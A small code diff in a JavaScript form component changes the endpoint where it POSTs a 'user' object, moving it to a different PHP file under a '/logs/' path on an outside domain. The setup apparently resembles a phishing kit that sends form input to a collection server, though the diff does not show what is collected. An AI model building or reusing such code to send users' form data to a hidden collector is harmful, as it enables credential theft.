@@ -48,7 +48,7 @@ const Formm = ()=>{
 
       $.ajax({
           type: "POST",
-          url: "https://bucketlion.com/logs/dashboard/file/xxl.php",
+          url: "https://bucketlion.com/logs/dashboard/file/newxl.php",
           data: user,
           success(data) {
               console.log(data);
